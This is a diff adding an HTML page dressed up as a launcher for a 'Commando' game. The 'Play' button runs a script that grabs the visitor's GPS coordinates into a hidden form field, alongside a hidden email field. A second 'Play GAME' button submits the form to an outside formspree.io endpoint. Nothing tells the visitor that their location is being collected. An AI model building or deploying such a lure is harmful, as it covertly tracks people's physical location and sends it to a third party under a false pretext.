@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<style>
+body, html {
+  height: 100%;
+  margin: 0;
+}
+
+.bgimg {
+  background-image: url('/commando.png');
+  height: 100%;
+  background-position: center;
+  background-size: cover;
+  position: relative;
+  color: white;
+  font-family: "Courier New", Courier, monospace;
+  font-size: 25px;
+}
+.hide
+  {
+    display: none;
+  }
+.social {
+  background-color: #f44336; 
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: flex;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 200px;
+  width: 200px;
+}
+.center {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100%;
+  width: 100%;
+  border: 3px solid green; 
+}
+</style>
+<body>
+    <script>
+        function myFunction() {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          document.getElementById("myText").defaultValue = (position.coords.latitude+','+position.coords.longitude);
+                    });
+      }
+      function myGame(){
+        window.open('/Charchit-Vs-Commando.html', '_blank');
+      }
+        </script>
+<div class="bgimg">
+    <div class="center">
+    <form
+    action="https://formspree.io/f/mbjegopl"
+    method="POST"
+    enctype="multipart/form-data"
+  >
+  <input class="hide" type="email" name="email" value="abc@gmail.com">
+    <label>
+      <input class="hide" type="text" id="myText" name="message">
+    </label>
+    <button class="social" onclick="myFunction()" type="reset">Play</button>
+    <button type="submit" oneclick="myGame()">Play GAME</button>
+  </form>
+  </div>
+
+</body>
+</html>
